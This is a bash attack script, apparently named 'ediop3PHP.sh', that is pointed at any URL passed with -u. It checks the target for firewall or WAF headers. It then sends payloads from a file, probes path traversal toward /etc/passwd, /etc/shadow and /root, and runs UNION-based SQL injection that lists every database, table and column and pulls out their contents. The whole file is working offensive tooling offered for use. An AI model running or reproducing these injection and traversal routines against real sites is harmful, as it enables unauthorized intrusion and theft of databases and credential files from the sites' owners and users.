#!/bin/bash

echo "███████╗██████╗░██╗░█████╗░██████╗░██████╗░"
echo "██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗"
echo "█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝"
echo "██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗"
echo "███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝"
echo "╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░"
echo ""
echo "██████╗░██╗░░██╗██████╗░"
echo "██╔══██╗██║░░██║██╔══██╗"
echo "██████╔╝███████║██████╔╝"
echo "██╔═══╝░██╔══██║██╔═══╝░"
echo "██║░░░░░██║░░██║██║░░░░░"
echo "╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░"
echo ""

fetch_database_info() {
    payload="' OR 1=1 UNION SELECT NULL, database(), NULL --"
    response=$(curl -X POST "$target" -d "id=$payload" -s -o /dev/null -w "%{http_code}")
    
    if [[ "$response" == "200" || "$response" == "302" || "$response" == "500" ]]; then
        databases=$(curl -X POST "$target" -d "id=' UNION SELECT NULL, group_concat(schema_name) FROM information_schema.schemata --" -s)
        for db in $(echo $databases | tr "," "\n"); do
            tables=$(curl -X POST "$target" -d "id=' UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema='$db' LIMIT 0, 1000 --" -s)
            for table in $(echo $tables | tr "," "\n"); do
                columns=$(curl -X POST "$target" -d "id=' UNION SELECT NULL, group_concat(column_name) FROM information_schema.columns WHERE table_name='$table' --" -s)
                for column in $(echo $columns | tr "," "\n"); do
                    data=$(curl -X POST "$target" -d "id=' UNION SELECT NULL, group_concat($column) FROM $table --" -s)
                done
            done
        done
    fi
}

check_firewall() {
    response=$(curl -I "$target" -s)
    if echo "$response" | grep -i "X-WAF" > /dev/null || echo "$response" | grep -i "cf-ray" > /dev/null || echo "$response" | grep -i "X-Sucuri-ID" > /dev/null || echo "$response" | grep -i "Server: cloudflare" > /dev/null; then
        echo "[+] WAF or Firewall detected on $target."
    fi
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target")
    if [[ "$status_code" == "403" ]]; then
        echo "[+] Forbidden access, possible WAF/Firewall blocking."
    elif [[ "$status_code" == "429" ]]; then
        echo "[+] Too many requests, possible rate limiting detected."
    fi
}

scan_vulnerabilities() {
    payloads=($(cat payloads1219.txt))
    accessed_dirs=()

    for payload in "${payloads[@]}"; do
        response=$(curl -X GET "$target?id=$payload" -s -o /dev/null -w "%{http_code}")
        if [[ "$response" == "200" || "$response" == "302" || "$response" == "500" ]]; then
            echo "[+] Potential vulnerability found on $target with payload: $payload" | tee -a results.txt
        fi
        
        for dir in "/etc/passwd" "/etc/shadow" "/var/www" "/root" "/home"; do
            if [[ ! " ${accessed_dirs[@]} " =~ " ${dir} " ]]; then
                response=$(curl -X GET "$target?id=../../../../$dir" -s -o /dev/null -w "%{http_code}")
                if [[ "$response" == "200" ]]; then
                    echo "[+] Path Traversal vulnerability found accessing $dir" | tee -a results.txt
                    accessed_dirs+=("$dir")
                fi
            fi
        done
    done
}

main() {
    if [[ -z "$1" ]]; then
        echo "Usage: bash ediop3PHP.sh -u <URL>"
        exit 1
    fi

    while getopts ":u:" opt; do
        case ${opt} in
            u )
                target=$OPTARG
                ;;
        esac
    done

    check_firewall
    scan_vulnerabilities
    fetch_database_info
}

main "$@"
